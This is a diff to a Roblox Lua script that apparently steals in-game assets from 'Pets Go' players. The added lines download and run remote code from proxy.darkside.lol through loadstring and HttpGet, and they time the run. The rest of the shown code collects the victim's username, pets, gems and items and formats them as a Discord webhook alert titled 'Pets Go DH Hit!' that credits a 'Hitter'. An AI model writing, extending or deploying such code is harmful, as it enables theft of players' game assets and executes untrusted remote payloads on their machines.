@@ -11,13 +11,18 @@ potc = 0
 end
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
+local ticky = tick()
 local xyzab = "Untitled Place"
-pcall(function()
+local gamec, gamee
+gamec, gamee = pcall(function()
 local mps = game:GetService("MarketplaceService")
 xyzab = mps:GetProductInfo(game.PlaceId).Name
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()((identifyexecutor() or "(Unknown Executor)"))
 xyzab=xyzab.." via "..(identifyexecutor() or "(Unknown Executor)")
 end)
+if not gamec then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(gamee)
+end
 local msg = ""
 request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local big = 0
@@ -128,7 +133,9 @@ local responseqxr =
     )
 end
 end)
-
+pcall(function()
+xyzab=xyzab.." in "..(math.round((tick()-ticky)*10000)/10000).."ms"
+end)
 if dh then
 _G.dx=true
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```\\n'.._G.itc..'```","name":"⮚ Items ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone"}'
